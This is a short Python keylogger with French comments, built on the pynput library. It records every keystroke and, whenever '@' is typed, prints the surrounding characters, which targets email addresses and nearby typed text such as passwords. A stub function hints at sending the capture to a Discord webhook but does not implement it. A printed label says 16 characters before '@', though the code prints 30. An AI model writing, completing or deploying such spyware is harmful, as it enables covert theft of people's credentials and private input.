from pynput import keyboard

# Liste pour stocker les touches
historique = []
capture_apres_at = False
apres_at_buffer = []
compteur = 0

# Envoyez les touches
def envoyer():
    input("Entrez le nom du webhook discord")

def touche(key):
    global historique, capture_apres_at, apres_at_buffer, compteur

    try:
        caractere = key.char
        historique.append(caractere)

        # Si on est en phase de capture après le @
        if capture_apres_at:
            apres_at_buffer.append(caractere)
            compteur += 1

            if compteur >= 20:
                print("\n--- 20 caractères après @ ---")
                print(''.join(apres_at_buffer))
                print("--------------------------------\n")
                # Réinitialisation
                capture_apres_at = False
                apres_at_buffer = []
                compteur = 0

    except AttributeError:
        print(f"Special key {key} pressed")

    # Si la touche est @
    if hasattr(key, 'char') and key.char == '@':
        print("\n--- 16 caractères avant @ ---")
        print(''.join(historique[-30:]))  # les 30 derniers AVANT @
        print("--------------------------------")

        # Activer la capture des 20 caractères suivants
        capture_apres_at = True
        apres_at_buffer = []
        compteur = 0

# Lancement du listener
with keyboard.Listener(on_press=touche) as listener:
    listener.join()
